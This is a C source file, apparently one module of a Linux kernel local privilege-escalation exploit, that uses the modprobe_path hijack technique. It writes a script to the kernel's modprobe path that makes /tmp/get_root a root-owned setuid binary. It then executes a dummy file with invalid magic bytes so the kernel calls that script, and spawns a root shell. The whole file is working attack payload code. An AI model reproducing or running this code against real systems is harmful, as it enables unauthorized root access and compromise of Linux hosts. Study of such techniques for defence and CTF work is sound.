#include <fcntl.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "log.h"
#include "modprobe.h"

const char dummy_file[] = "/tmp/dummy\0";

const char dummy_content[] = "\xff\xff\xff\xff";
const char new_modprobe_content[] = "#!/bin/sh\n\nchown 0:0 /tmp/get_root\nchmod 4555 /tmp/get_root\n";

/**
 * prepare_root_shell(): Setup a second process waiting out the namespaces used for the exploit
 */
void prepare_root_shell(void) {

    // int shmid = shmget(0x1337, sizeof(sem_t), IPC_CREAT | S_IRWXU | S_IRWXG | S_IRWXO);
    // shell_barrier = shmat(shmid, NULL, 0);

    // if (sem_init(shell_barrier, 1, 0) < 0)
    //     do_error_exit("sem_init");

    system("cp get_root /tmp");
}

/**
 * create_dummy_file(): Create a file to trigger call_modprobe in case of execution
 */
void create_dummy_file(void) {

    int fd;

    fd = open(dummy_file, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    write(fd, dummy_content, sizeof(dummy_content));
    close(fd);
}

/**
 * get_root_shell(): Trigger a call to the new modprobe_path
 */
void get_root_shell(void) {

    // system("sh");

    int pid = fork();
    if (pid == 0) {
        execl("/tmp/dummy", "/tmp/dummy", NULL);
        puts("can;t be here");
        exit(1);
    }
    waitpid(pid, NULL, 0);
    execl("/tmp/get_root", "/tmp/get_root", NULL);
}

/**
 * get_new_modprobe_path(): Read the new modprobe_path
 *
 * Return: path stored within /proc/sys/kernel/modprobe
 */
char *get_new_modprobe_path(void) {

    int fd;
    char *modprobe_path = malloc(15);

    if (!modprobe_path){
        die("malloc: %m");
    }

    fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0){
        die("open(/proc/sys/kernel/modprobe): %m");
    }

    read(fd, modprobe_path, 14);

    close(fd);

    modprobe_path[14] = '\0';

    return modprobe_path;
}

/**
 * write_new_modprobe(): Create chown && chmod script for get_root
 * @filename: current path to modprobe for the kernel
 */
void write_new_modprobe(char *filename) {

    int fd;

    fd = open(filename, O_CREAT | O_RDWR, S_IRWXU | S_IRWXG | S_IRWXO);
    if (fd < 0){
        die("open: %m");
    }

    write(fd, new_modprobe_content, sizeof(new_modprobe_content));

    close(fd);
}

/**
 * setup_modprobe_payload(): Prepare all the needed stuff to get a root shell
 */
void setup_modprobe_payload(void) {

    char *filename;

    filename = get_new_modprobe_path();

    write_new_modprobe(filename);
    create_dummy_file();

    free(filename);
}
